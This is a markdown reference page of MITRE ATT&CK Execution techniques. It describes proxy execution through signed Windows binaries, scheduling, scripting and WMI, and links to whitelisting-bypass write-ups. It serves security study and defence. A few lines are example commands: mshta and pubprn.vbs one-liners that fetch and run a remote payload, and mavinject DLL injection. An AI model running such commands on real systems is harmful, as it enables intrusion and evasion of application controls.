#  Execution


[MITRE ATT&CK - Execution](https://attack.mitre.org/wiki/execution)
* The execution tactic represents techniques that result in execution of adversary-controlled code on a local or remote system. This tactic is often used in conjunction with lateral movement to expand access to remote systems on a network. 



* [Windows oneliners to download remote payload and execute arbitrary code - arno0x0x](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
* [Arbitrary, Unsigned Code Execution Vector in Microsoft.Workflow.Compiler.exe - Matt Graeber](https://posts.specterops.io/arbitrary-unsigned-code-execution-vector-in-microsoft-workflow-compiler-exe-3d9294bc5efb)
* [How to Port Microsoft.Workflow.Compiler.exe Loader to Veil - FortyNorthSecurity](https://www.fortynorthsecurity.com/port-microsoft-workflow-compiler-exe-loader-to-veil/)
* [MSXSL.EXE AND WMIC.EXE — A Way to Proxy Code Execution - TH Team](https://medium.com/@threathuntingteam/msxsl-exe-and-wmic-exe-a-way-to-proxy-code-execution-8d524f642b75)






-------------------------------
## Process Hollowing
* [Process Hollowing - ATT&CK](https://attack.mitre.org/wiki/Technique/T1093)
	* Process hollowing occurs when a process is created in a suspended state and the process's memory is replaced with the code of a second program so that the second program runs instead of the original program. Windows and process monitoring tools believe the original process is running, whereas the actual program running is different. Hollowing Process hollowing may be used similarly to DLL Injection to evade defenses and detection analysis of malicious process execution by launching adversary-controlled code under the context of a legitimate process.

#### Windows
* [Process Hollowing - John Leitch - PDF](http://www.autosectools.com/process-hollowing.pdf)
* [Process-Hollowing](https://github.com/m0n0ph1/Process-Hollowing)
	* Great explanation of Process Hollowing






------------------------------- 
## AppleScript

* [AppleScript - ATT&CK](https://attack.mitre.org/wiki/Technique/T1155)
	* macOS and OS X applications send AppleEvent messages to each other for interprocess communications (IPC). These messages can be easily scripted with AppleScript for local or remote IPC. Osascript executes AppleScript and any other Open Scripting Architecture (OSA) language scripts. A list of OSA languages installed on a system can be found by using the `osalang` program. 
	* AppleEvent messages can be sent independently or as part of a script. These events can locate open windows, send keystrokes, and interact with almost any open application locally or remotely. 
	*  Adversaries can use this to interact with open SSH connection, move to remote machines, and even present users with fake dialog boxes. These events cannot start applications remotely (they can start them locally though), but can interact with applications if they're already running remotely. Since this is a scripting language, it can be used to launch more common techniques as well such as a reverse shell via python Macro Malware Targets Macs. Scripts can be run from the command lie via `osascript /path/to/script` or `osascript -e "script here"`.

#### OS X
* [osascript - SS64](https://ss64.com/osx/osascript.html)
* [AppleScript - Wikipedia](https://en.wikipedia.org/wiki/AppleScript)
* [Introduction to AppleScript Language Guide - developer.apple](https://developer.apple.com/library/content/documentation/AppleScript/Conceptual/AppleScriptLangGuide/introduction/ASLR_intro.html)
* [Javascript for Automation - Release Notes 10.10 - dev.apple](https://developer.apple.com/library/content/releasenotes/InterapplicationCommunication/RN-JavaScriptForAutomation/Articles/OSX10-10.html)




------------------------------- 
## CMSTP

* [CMSTP - ATT&CK](https://attack.mitre.org/wiki/Technique/T1191)
	* The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles. CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.
	* Adversaries may supply CMSTP.exe with INF files infected with malicious commands. Similar to Regsvr32 / ”Squiblydoo”, CMSTP.exe may be abused to load and execute DLLs and/or COM scriptlets (SCT) from remote servers. This execution may also bypass AppLocker and other whitelisting defenses since CMSTP.exe is a legitimate, signed Microsoft application.
	* CMSTP.exe can also be abused to Bypass User Account Control and execute arbitrary commands from a malicious INF through an auto-elevated COM interface.


-------------------------------
## Command-Line Interface
* [Command-Line Interface - ATT&CK](https://attack.mitre.org/wiki/Technique/T1059)
	* Command-line interfaces provide a way of interacting with computer systems and is a common feature across many types of operating system platforms.Wikipedia Command-Line Interface One example command-line interface on Windows systems is cmd, which can be used to perform a number of tasks including execution of other software. Command-line interfaces can be interacted with locally or remotely via a remote desktop application, reverse shell session, etc. Commands that are executed run with the current permission level of the command-line interface process unless the command includes process invocation that changes permissions context for that execution (e.g. Scheduled Task). Adversaries may use command-line interfaces to interact with systems and execute other software during the course of an operation.

#### Linux
* [Linuxcommand.org](http://linuxcommand.org/lc3_learning_the_shell.php)
* [Learn the Bash Command Line](https://ryanstutorials.net/linuxtutorial/)

#### OS X

#### Windows






------------------------------- 
## Control Panel Items
* [Control Panel Items - ATT&CK](https://attack.mitre.org/wiki/Technique/T1196)
	* Windows Control Panel items are utilities that allow users to view and adjust computer settings. Control Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a CPlApplet function. Control Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file.
	* For ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel.
	* Adversaries can use Control Panel items as execution payloads to execute arbitrary commands. Malicious Control Panel items can be delivered via Spearphishing Attachment campaigns 23 or executed as part of multi-stage malware.4 Control Panel items, specifically CPL files, may also bypass application and/or file extension whitelisting. 





------------------------------- 
## Dynamic Data Exchange
* [Dynamic Data Exchange - ATT&CK](https://attack.mitre.org/wiki/Technique/T1173)
	* Windows Dynamic Data Exchange (DDE) is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.
	* Object Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by COM, DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys.123
	* Adversaries may use DDE to execute arbitrary commands. Microsoft Office documents can be poisoned with DDE commands45, directly or through embedded files6, and used to deliver execution via phishing campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros.7 DDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to command line execution. 







-------------------------------
## Execution through API
* [Execution through API - ATT&CK](https://attack.mitre.org/wiki/Technique/T1106)
	* Adversary tools may directly use the Windows application programming interface (API) to execute binaries.

#### Linux

#### OS X

#### Windows
* [Execution through API - ATT&CK](https://attack.mitre.org/wiki/Technique/T1106)
	* Adversary tools may directly use the Windows application programming interface (API) to execute binaries. Functions such as the Windows API CreateProcess will allow programs and scripts to start other processes with proper path and argument parameters.
	* Additional Windows API calls that can be used to execute binaries include:
		* CreateProcessA() and CreateProcessW(),
		* CreateProcessAsUserA() and CreateProcessAsUserW(),
		* CreateProcessInternalA() and CreateProcessInternalW(),
		* CreateProcessWithLogonW(), CreateProcessWithTokenW(),
		* LoadLibraryA() and LoadLibraryW(),
		* LoadLibraryExA() and LoadLibraryExW(),
		* LoadModule(),
		* LoadPackagedLibrary(),
		* WinExec(),
		* ShellExecuteA() and ShellExecuteW(),
		* ShellExecuteExA() and ShellExecuteExW()
* [Application Verifier Provider](https://skanthak.homepage.t-online.de/verifier.html)
* [CreateProcess function - msdn](https://msdn.microsoft.com/en-us/library/ms682425)



-------------------------------
## Execution through Module Load
* [Execution through Module Load - ATT&CK](https://attack.mitre.org/wiki/Technique/T1129)
	* The Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in NTDLL.dll and is part of the Windows Native API which is called from functions like CreateProcess(), LoadLibrary(), etc. of the Win32 API.1
	* The module loader can load DLLs:
		* via specification of the (fully-qualified or relative) DLL pathname in the IMPORT directory;
		* via EXPORT forwarded to another DLL, specified with (fully-qualified or relative) pathname (but without extension);
		* via an NTFS junction or symlink program.exe.local with the fully-qualified or relative pathname of a directory containing the DLLs specified in the IMPORT directory or forwarded EXPORTs;
		* via `<file name="filename.extension" loadFrom="fully-qualified or relative pathname">` in an embedded or external "application manifest". The file name refers to an entry in the IMPORT directory or a forwarded EXPORT.
	* Adversaries can use this functionality as a way to execute arbitrary code on a system.




-------------------------------
## Exploitation for Client Execution
* [Exploitation for Client Execution - ATT&CK](https://attack.mitre.org/wiki/Technique/T1203)
	* Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility. 
	* **Browser-based Exploitation**
		* Web browsers are a common target through Drive-by Compromise and Spearphishing Link. Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed. 
	* **Office Applications**
		* Common office and productivity applications such as Microsoft Office are also targeted through Spearphishing Attachment, Spearphishing Link, and Spearphishing via Service. Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run. 
	* **Common Third-party Applications**
		* Other applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.





-------------------------------
## Graphical User Interface

* [Graphical User Interface - ATT&CK](https://attack.mitre.org/wiki/Technique/T1061)
	* Cause a binary or script to execute based on interacting with the file through a graphical user interface (GUI) or in an interactive remote session such as Remote Desktop Protocol.





-------------------------------
## InstallUtil
* [InstallUtil - ATT&CK](https://attack.mitre.org/wiki/Technique/T1118)
	* InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries. InstallUtil is located in the .NET directory on a Windows system: `C:\Windows\Microsoft.NET\Framework\v<version>\InstallUtil.exe`. InstallUtil.exe is digitally signed by Microsoft. Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil may also be used to bypass process whitelisting through use of attributes within the binary that execute the class decorated with the attribute [System.ComponentModel.RunInstaller(true)].

#### Windows
* [Installutil.exe (Installer Tool) - MSDN](https://docs.microsoft.com/en-us/dotnet/framework/tools/installutil-exe-installer-tool)
* [AllTheThings](https://github.com/subTee/AllTheThings)
	* Includes 5 Known Application Whitelisting/ Application Control Bypass Techniques in One File. (First one is InstallUtil)



------------------------------- 
## LSASS Driver
* [LSASS Driver - ATT&CK](https://attack.mitre.org/wiki/Technique/T1177)
	* The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process.
	* Adversaries may target lsass.exe drivers to obtain execution and/or persistence. By either replacing or adding illegitimate drivers (e.g., DLL Side-Loading or DLL Search Order Hijacking), an adversary can achieve arbitrary code execution triggered by continuous LSA operations. 



------------------------------- 
## Launchctl
* [Launchctl - ATT&CK](https://attack.mitre.org/wiki/Technique/T1152)
	* Launchctl controls the macOS launchd process which handles things like launch agents and launch daemons, but can execute other commands or programs itself. Launchctl supports taking subcommands on the command-line, interactively, or even redirected from standard input. By loading or reloading launch agents or launch daemons, adversaries can install persistence or execute changes they made Sofacy Komplex Trojan. Running a command from launchctl is as simple as `launchctl submit -l <labelName> -- /Path/to/thing/to/execute "arg" "arg" "arg"`. Loading, unloading, or reloading launch agents or launch daemons can require elevated privileges. Adversaries can abuse this functionality to execute code or even bypass whitelisting if launchctl is an allowed process.



------------------------------- 
## Local Job Scheduling
* [Local Job Scheduling - ATT&CK](https://attack.mitre.org/wiki/Technique/T1168)
	* On Linux and Apple systems, multiple methods are supported for creating pre-scheduled and periodic background jobs: cron, at, and launchd.3 Unlike 	Scheduled Task on Windows systems, job scheduling on Linux-based systems cannot be done remotely unless used in conjunction within an established remote session, like secure shell (SSH). 
	* **cron**
		* System-wide cron jobs are installed by modifying `/etc/crontab` file, `/etc/cron.d/` directory or other locations supported by the Cron daemon, while per-user cron jobs are installed using crontab with specifically formatted crontab files.3 This works on Mac and Linux systems.
		* Those methods allow for commands or scripts to be executed at specific, periodic intervals in the background without user interaction. An adversary may use job scheduling to execute programs at system startup or on a scheduled basis for Persistence, to conduct Execution as part of Lateral Movement, to gain root privileges, or to run a process under the context of a specific account.
	* **at**
		* The at program is another means on Linux-based systems, including Mac, to schedule a program or script job for execution at a later date and/or time, which could also be used for the same purposes.
	* **launchd**
		* Each launchd job is described by a different configuration property list (plist) file similar to Launch Daemon or Launch Agent, except there is an additional key called StartCalendarInterval with a dictionary of time values. This only works on macOS and OS X. 



------------------------------- 
## Mshta
* [Mshta - ATT&CK](https://attack.mitre.org/wiki/Technique/T1170)
	* Mshta.exe is a utility that executes Microsoft HTML Applications (HTA). HTA files have the file extension `.hta`. HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser.
	* Adversaries can use mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code34567
	* Files may be executed by mshta.exe through an inline script: `mshta vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))`
	* They may also be executed directly from URLs: `mshta http[:]//webserver/payload[.]hta`
	* Mshta.exe can be used to bypass application whitelisting solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings.







-------------------------------
## Powershell
* [PowerShell](https://attack.mitre.org/wiki/Technique/T1086)
	* PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.TechNet PowerShell Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs a command locally or on a remote computer. 
	* PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk. 
	* Administrator permissions are required to use PowerShell to connect to remote systems. 
	*  A number of PowerShell-based offensive testing tools are available, including Empire,Github PowerShell Empire PowerSploit,Powersploit and PSAttack.Github PSAttack


#### Windows
* [PowerShell - ms docs](https://docs.microsoft.com/en-us/powershell/scripting/powershell-scripting?view=powershell-5.1)
* [Powershell - Wikipedia](https://en.wikipedia.org/wiki/PowerShell)
* [Microsoft Powershell - msdn](https://msdn.microsoft.com/en-us/powershell/mt173057.aspx)






-------------------------------
## Regsvcs/Regasm
* [Regsvcs/Regasm - ATT&CK](https://attack.mitre.org/wiki/Technique/T1121)
	* Regsvcs and Regasm are Windows command-line utilities that are used to register .NET Component Object Model (COM) assemblies. Both are digitally signed by Microsoft.MSDN RegsvcsMSDN Regasm Adversaries can use Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Both utilities may be used to bypass process whitelisting through use of attributes within the binary to specify code that should be run before registration or unregistration: `[ComRegisterFunction]` or `[ComUnregisterFunction]` respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute.SubTee GitHub All The Things Application Whitelisting Bypass

#### Windows
* [Regsvcs.exe (.NET Services Installation Tool) - msdn](https://docs.microsoft.com/en-us/dotnet/framework/tools/regsvcs-exe-net-services-installation-tool)
* [Regasm.exe (Assembly Registration Tool) - msdn](https://docs.microsoft.com/en-us/dotnet/framework/tools/regasm-exe-assembly-registration-tool)









-------------------------------
## Regsvr32
* [Regsvr32 - ATT&CK](https://attack.mitre.org/wiki/Technique/T1117)
	* Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. Regsvr32.exe can be used to execute arbitrary binaries.Microsoft Regsvr32 
	* Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of whitelists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe is also a Microsoft signed binary. 
	*  Regsvr32.exe can also be used to specifically bypass process whitelisting using functionality to load COM scriptlets to execute DLLs under user permissions. Since regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed.SubTee Regsvr32 Whitelisting Bypass This variation of the technique has been used in campaigns targeting governments.FireEye Regsvr32 Targeting Mongolian Gov

#### Windows
* [How to use the Regsvr32 tool and troubleshoot Regsvr32 error messages](https://support.microsoft.com/en-us/help/249873/how-to-use-the-regsvr32-tool-and-troubleshoot-regsvr32-error-messages)
* [How to Evade Application Whitelisting Using REGSVR32 - BHIS](https://www.blackhillsinfosec.com/evade-application-whitelisting-using-regsvr32/)
* [Bypass Application Whitelisting Script Protections - Regsvr32.exe & COM Scriptlets (.sct files) - subTee](http://subt0x10.blogspot.com/2017/04/bypass-application-whitelisting-script.html)
* [Practical use of JavaScript and COM Scriptlets for Penetration Testing](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)







-------------------------------
## Rundll32
* [Rundll32 - ATT&CK](https://attack.mitre.org/wiki/Technique/T1085)
	* The rundll32.exe program can be called to execute an arbitrary binary. Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of the rundll32.exe process because of whitelists or false positives from Windows using rundll32.exe for normal operations.

#### Windows
* [Rundll32 - technet](https://technet.microsoft.com/en-us/library/ee649171(v=ws.11).aspx)
* [AppLocker Bypass – Rundll32 - pentesterlab](https://pentestlab.blog/tag/rundll32/)




-------------------------------
## Scheduled Tasks
* [Scheduled Tasks - ATT&CK](https://attack.mitre.org/wiki/Technique/T1053)
	* Utilities such as at and schtasks, along with the Windows Task Scheduler, can be used to schedule programs or scripts to be executed at a date and time. The account used to create the task must be in the Administrators group on the local system. A task can also be scheduled on a remote system, provided the proper authentication is met to use RPC and file and printer sharing is turned on.TechNet Task Scheduler Security An adversary may use task scheduling to execute programs at system startup or on a scheduled basis for persistence, to conduct remote Execution as part of Lateral Movement, to gain SYSTEM privileges, or to run a process under the context of a specified account.

#### Linux

#### OS X

#### Windows
* [Schedule a Task - MSDN](https://technet.microsoft.com/en-us/library/cc748993(v=ws.11).aspx)
* [Schtasks.exe - MSDN](https://msdn.microsoft.com/en-us/library/windows/desktop/bb736357(v=vs.85).aspx)
	* Enables an administrator to create, delete, query, change, run, and end scheduled tasks on a local or remote computer. Running Schtasks.exe without arguments displays the status and next run time for each registered task.
* [At - MSDN](https://technet.microsoft.com/en-us/library/bb490866.aspx)
	* Schedules commands and programs to run on a computer at a specified time and date. You can use at only when the Schedule service is running. Used without parameters, at lists scheduled commands.
* [How To Use the AT Command to Schedule Tasks - MS](https://support.microsoft.com/en-us/help/313565/how-to-use-the-at-command-to-schedule-tasks)








-------------------------------
## Scripting
* [Scripting - ATT&CK](https://attack.mitre.org/wiki/Technique/T1064)
	* Adversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and PowerShell but could also be in the form of command-line batch scripts. Many popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike. MetasploitMetasploit, VeilVeil, and PowerSploitPowersploit are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell.Alperovitch 2014

#### OS X
* [Shell Script Basics - developer.apple](https://developer.apple.com/library/content/documentation/OpenSource/Conceptual/ShellScripting/shell_scripts/shell_scripts.html)










-------------------------------
## Service Execution
* [Service Execution - ATT&CK](https://attack.mitre.org/wiki/Technique/T1035)
	* Adversaries may execute a binary, command, or script via a method that interacts with Windows services, such as the Service Control Manager. This can be done by either creating a new service or modifying an existing service. This technique is the execution used in conjunction with New Service and Modify Existing Service during service persistence or privilege escalation.

#### Linux
#### OS X
#### Windows
* [Net.exe reference.](http://windowsitpro.com/windows/netexe-reference)
* [PSExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)
* [xCmd an Alternative to PsExec](https://ashwinrayaprolu.wordpress.com/2011/04/12/xcmd-an-alternative-to-psexec/)






-------------------------------
## Signed Binary Proxy Execution
* [Signed Binary Proxy Execution - ATT&CK](https://attack.mitre.org/wiki/Technique/T1218)
	* Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files. This behavior may be abused by adversaries to execute malicious files that could bypass application whitelisting and signature validation on systems. This technique accounts for proxy execution methods that are not already accounted for within the existing techniques. 
	* **Mavinject.exe**
		* Mavinject.exe is a Windows utility that allows for code execution. Mavinject can be used to input a DLL into a running process.1
			* `"C:\Program Files\Common Files\microsoft shared\ClickToRun\MavInject32.exe" <PID> /INJECTRUNNING <PATH DLL>`
			* `C:\Windows\system32\mavinject.exe <PID> /INJECTRUNNING <PATH DLL>`
	* **SyncAppvPublishingServer.exe**
		* SyncAppvPublishingServer.exe can be used to run powershell scripts without executing powershell.exe.
		* Several others binaries exist that may be used to perform similar behavior.






-------------------------------
## Signed Binary Proxy Execution
* [Signed Script Proxy Execution - ATT&CK](https://attack.mitre.org/wiki/Technique/T1216)
	* Scripts signed with trusted certificates can be used to proxy execution of malicious files. This behavior may bypass signature validation restrictions and application whitelisting solutions that do not account for use of these scripts.
	* PubPrn.vbs is signed by Microsoft and can be used to proxy execution from a remote site.
		* Example command: `cscript C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs 127.0.0.1 script:http[:]//192.168.1.100/hi.png`
		* There are several other signed scripts that may be used in a similar manner.





------------------------------- 
## Source
* [Source - ATT&CK](https://attack.mitre.org/wiki/Technique/T1153)
	* The source command loads functions into the current shell or executes files in the current context. This built-in command can be run in two different ways `source /path/to/filename [arguments]` or . `/path/to/filename [arguments]`. Take note of the space after the ".". Without a space, a new shell is created that runs the program instead of running the program within the current context. This is often used to make certain features or functions available to a shell or to update a specific shell's environment. Adversaries can abuse this functionality to execute programs. The file executed with this technique does not need to be marked executable beforehand.

#### Linux
* [Sourcing a File - tldp](http://www.tldp.org/HOWTO/Bash-Prompt-HOWTO/x237.html)
* [Source command - bash.cyberciti](https://bash.cyberciti.biz/guide/Source_command)



 

-------------------------------
## Spaces after Filename 
* [Spaces after Filename - ATT&CK](https://attack.mitre.org/wiki/Technique/T1151)
	* Adversaries can hide a program's true filetype by changing the extension of a file. With certain file types (specifically this does not work with .app extensions), appending a space to the end of a filename will change how the file is processed by the operating system. For example, if there is a Mach-O executable file called evil.bin, when it is double clicked by a user, it will launch Terminal.app and execute. If this file is renamed to evil.txt, then when double clicked by a user, it will launch with the default text editing application (not executing the binary). However, if the file is renamed to "evil.txt " (note the space at the end), then when double clicked by a user, the true file type is determined by the OS and handled appropriately and the binary will be executed.









-------------------------------
## Third-Party Software
* [Third-Party Software - ATT&CK](https://attack.mitre.org/wiki/Technique/T1072)
	* Third-party applications and software deployment systems may be in use in the network environment for administration purposes (e.g., SCCM, VNC, HBSS, Altiris, etc.). If an adversary gains access to these systems, then they may be able to execute code. 
	* Adversaries may gain access to and use third-party application deployment systems installed within an enterprise network. Access to a network-wide or enterprise-wide software deployment system enables an adversary to have remote code execution on all systems that are connected to such a system. The access may be used to laterally move to systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints. 
	*  The permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the deployment server, or specific domain credentials may be required. However, the system may require an administrative account to log in or to perform software deployment.





-------------------------------
## Trap
* [Trap - ATT&CK](https://attack.mitre.org/wiki/Technique/T1154)
	* The `trap` command allows programs and shells to specify commands that will be executed upon receiving interrupt signals. A common situation is a script allowing for graceful termination and handling of common keyboard interrupts like ctrl+c and ctrl+d. Adversaries can use this to register code to be executed when the shell encounters specific interrupts either to gain execution or as a persistence mechanism. Trap commands are of the following format `trap` 'command list' signals where "command list" will be executed when "signals" are received.

#### Linux
* [Traps - tldp](http://tldp.org/LDP/Bash-Beginners-Guide/html/sect_12_02.html)
* [Shell Scripting Tutorial - Trap](https://www.shellscript.sh/trap.html)
* [Unix / Linux - Signals and Traps - TutorialsPoint](https://www.tutorialspoint.com/unix/unix-signals-traps.htm)












------------------------------
## Trusted Developer Utilites
Trusted Developer Utilities
* [Trusted Developer Utilities -* ATT&CK](https://attack.mitre.org/wiki/Technique/T1127)
	* There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering. These utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application whitelisting defensive solutions. 

### MSBuild
* MSBuild.exe (Microsoft Build Engine) is a software build platform used by Visual Studio. It takes XML formatted project files that define requirements for building various platforms and configurations.MSDN MSBuild 
* Adversaries can use MSBuild to proxy execution of code through a trusted Windows utility. The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# code to be inserted into the XML project file.MSDN MSBuild Inline Tasks MSBuild will compile and execute the inline task. MSBuild.exe is a signed Microsoft binary, so when it is used this way it can execute arbitrary code and bypass application whitelisting defenses that are configured to allow MSBuild.exe execution.SubTee GitHub All The Things Application Whitelisting Bypass 
	* [MSBuild - MSDN](https://msdn.microsoft.com/library/dd393574.aspx)
	* [MSBuild Inline Tasks - msdn](https://msdn.microsoft.com/library/dd722601.aspx)
	* [MSBuild Inline Tasks - docs ms](https://docs.microsoft.com/en-us/visualstudio/msbuild/msbuild-inline-tasks)
	* [AppLocker Bypass – MSBuild - pentestlab](https://pentestlab.blog/2017/05/29/applocker-bypass-msbuild/)



### DNX
 * The .NET Execution Environment (DNX), dnx.exe, is a software development kit packaged with Visual Studio Enterprise. It was retired in favor of .NET Core CLI in 2016.Microsoft Migrating from DNX DNX is not present on standard builds of Windows and may only be present on developer workstations using older versions of .NET Core and ASP.NET Core 1.0. The dnx.exe executable is signed by Microsoft. 
 * An adversary can use dnx.exe to proxy execution of arbitrary code to bypass application whitelist policies that do not account for DNX.engima0x3 DNX Bypass 
	* [Migrating from DNX to .NET Core CLI (project.json) - docs ms](https://docs.microsoft.com/en-us/dotnet/core/migration/from-dnx)
	* [Bypassing Application Whitelisting By Using dnx.exe - enigma0x3](https://enigma0x3.net/2016/11/17/bypassing-application-whitelisting-by-using-dnx-exe/)



### RCSI
* The rcsi.exe utility is a non-interactive command-line interface for C# that is similar to csi.exe. It was provided within an early version of the Roslyn .NET Compiler Platform but has since been deprecated for an integrated solution.Microsoft Roslyn CPT RCSI The rcsi.exe binary is signed by Microsoft.engima0x3 RCSI Bypass 
* C# .csx script files can be written and executed with rcsi.exe at the command-line. An adversary can use rcsi.exe to proxy execution of arbitrary code to bypass application whitelisting policies that do not account for execution of rcsi.exe.engima0x3 RCSI Bypass 
	* [Introducing the Microsoft “Roslyn” CTP](https://blogs.msdn.microsoft.com/visualstudio/2011/10/19/introducing-the-microsoft-roslyn-ctp/)
	* [Bypassing Application Whitelisting By Using rcsi.exe - enigma0x3](https://enigma0x3.net/2016/11/21/bypassing-application-whitelisting-by-using-rcsi-exe/)



### WinDbg/CDB
* WinDbg is a Microsoft Windows kernel and user-mode debugging utility. The Microsoft Console Debugger (CDB) cdb.exe is also user-mode debugger. Both utilities are included in Windows software development kits and can be used as standalone tools.Microsoft Debugging Tools for Windows They are commonly used in software development and reverse engineering and may not be found on typical Windows systems. Both WinDbg.exe and cdb.exe binaries are signed by Microsoft. 
* An adversary can use WinDbg.exe and cdb.exe to proxy execution of arbitrary code to bypass application whitelist policies that do not account for execution of those utilities.Exploit Monday WinDbg 
*  It is likely possible to use other debuggers for similar purposes, such as the kernel-mode debugger kd.exe, which is also signed by Microsoft.
	* [Debugging Tools for Windows (WinDbg, KD, CDB, NTSD) -docs ms](https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/index)
	* [Bypassing Application Whitelisting by using WinDbg/CDB as a Shellcode Runner - exploitmonday](http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html)








-------------------------------
## User Execution
* [User Execution - ATT&CK](https://attack.mitre.org/wiki/Technique/T1204)
	* An adversary may rely upon specific actions by a user in order to gain execution. This may be direct code execution, such as when a user opens a malicious executable delivered via Spearphishing Attachment with the icon and apparent extension of a document file. It also may lead to other execution techniques, such as when a user clicks on a link delivered via Spearphishing Link that leads to exploitation of a browser or application vulnerability via Exploitation for Client Execution. While User Execution frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. 







-------------------------------
## Windows Management Instrumentation
* [Windows Management Instrumentation - ATT&CK](https://attack.mitre.org/wiki/Technique/T1047)
	* Windows Management Instrumentation (WMI) is a Windows administration feature that provides a uniform environment for local and remote access to Windows system components. It relies on the WMI service for local and remote access and the server message block (SMB)Wikipedia SMB and Remote Procedure Call Service (RPCS)TechNet RPC for remote access. RPCS operates over port 135.MSDN WMI An adversary can use WMI to interact with local and remote systems and use it as a means to perform many tactic functions, such as gathering information for Discovery and remote Execution of files as part of Lateral Movement.FireEye WMI 2015

#### Windows
* [Windows Management Instrumentation - msdn](https://msdn.microsoft.com/en-us/library/aa394582.aspx)
* [Windows Management  Instrumentation (WMI) Offense, Defense, and Forensics](https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf)
* [WMI_Backdoor](https://github.com/mattifestation/WMI_Backdoor)
	* A PoC WMI backdoor presented at Black Hat 2015
* [Abusing Windows Management Instrumentation (WMI) to Build a persistent, Asynchronous and Fileless Backdoor](http://www.securitynewspaper.com/2015/10/10/abusing-windows-management-instrumentation-wmi-to-build-a-persistent-asynchronous-and-fileless-backdoor/)
* [Introduction to WMI Basics with PowerShell Part 1 (What it is and exploring it with a GUI)](https://www.darkoperator.com/blog/2013/1/31/introduction-to-wmi-basics-with-powershell-part-1-what-it-is.html)
* [Creating a WMI Script - msdn](https://msdn.microsoft.com/en-us/library/aa389763(v=vs.85).aspx)
